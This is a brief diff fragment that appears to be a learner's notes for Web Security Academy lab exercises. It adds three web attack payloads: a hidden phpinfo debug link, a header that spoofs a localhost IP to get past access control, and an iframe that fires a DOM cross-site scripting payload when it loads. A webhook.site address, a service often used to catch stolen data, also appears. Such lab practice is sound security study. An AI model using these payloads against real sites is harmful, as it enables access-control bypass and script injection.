@@ -18,3 +18,11 @@ Host:
 
 
 https://webhook.site/
+
+
+<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
+
+
+X-Custom-IP-Authorization: 127.0.0.1
+
+<iframe src="https://0a9d00ea0479b5a5c0f05b2b007a00e0.web-security-academy.net/#" onload="this.src+='<img src=x onerror=print()>'"></iframe>
